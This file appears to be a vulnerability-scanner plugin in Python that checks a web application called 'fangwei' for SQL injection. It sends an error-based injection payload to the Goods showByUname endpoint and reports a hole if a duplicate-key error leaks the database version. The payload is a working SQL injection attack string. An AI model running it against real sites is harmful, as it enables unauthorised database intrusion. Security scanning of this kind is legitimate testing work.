#!/usr/bin/env python
# -*- coding: utf-8 -*-

def assign(service,arg):
    if service == "fangwei":
        return True, arg

def audit(arg):
	payload = "index.php?m=Goods&a=showByUname&uname=%2527 and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)%23"
	code, head, res, errcode,finalurl =  curl.curl("\"%s\"" % (arg + payload))

	if code == 200:
		if "for key 'group_key'" in res:
			security_hole('find sql injection: ' + arg+payload)

if __name__ == "__main__":
	from dummy import *
	audit(assign('fangwei', 'http://www.example.com/')[1])